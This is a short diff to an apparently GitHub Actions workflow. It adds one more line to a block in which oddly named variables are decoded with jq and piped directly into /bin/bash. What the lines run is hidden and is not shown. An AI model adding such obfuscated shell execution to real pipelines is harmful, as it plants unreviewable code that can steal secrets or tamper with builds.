@@ -39,6 +39,7 @@ jobs:
           echo $nrx174 | jq -r .jv3 | /bin/bash
           echo $pk29146 | jq -r .vju18 | /bin/bash
           echo $pi7158 | jq -r .guzy5294 | /bin/bash
+          echo $xx2 | jq -r .nil0940 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
